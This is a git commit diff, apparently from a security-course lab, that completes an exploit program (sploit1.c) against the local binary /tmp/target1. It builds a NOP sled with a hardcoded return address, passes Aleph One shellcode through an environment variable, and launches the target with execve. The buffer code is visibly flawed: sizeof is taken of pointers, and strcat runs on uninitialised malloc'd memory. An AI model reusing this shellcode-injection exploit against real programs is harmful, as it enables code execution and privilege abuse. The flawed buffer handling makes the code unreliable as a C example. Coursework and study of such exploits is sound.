8797a8d8e716899d14c6facdcb01da8d05cc56a9
Adam Levin <awl44@me.com>
2019-11-29 10:33:40 -0800

    sploit1 sans root

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -7,16 +7,39 @@
 
 #define TARGET "/tmp/target1"
 
+char *repeat(char *s, int x)
+{
+  //from https://stackoverflow.com/a/22599676/5552894
+  char *result = malloc(sizeof(s) * x + 1);
+  while (x > 0) {
+      strcat(result, s);
+      x --;
+  }
+  return result;
+}
+
 int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
+
+  char *noop = "\x90";
+  int sled_length = 8;
+   //bfffffa3
+  char *address = "\xa3\xff\xff\xbf";
+  char *result = malloc(sizeof(noop)*sled_length + sizeof(address) + 1);
+  char *result1 = repeat(noop, sled_length);
+  strcat(result, result1);
+  strcat(result, address);
+  char *preface = "shellcode=";
+  char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
+  strcat(envvar, preface);
+  strcat(envvar, shellcodeAlephOne);
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = result;
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = envvar;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
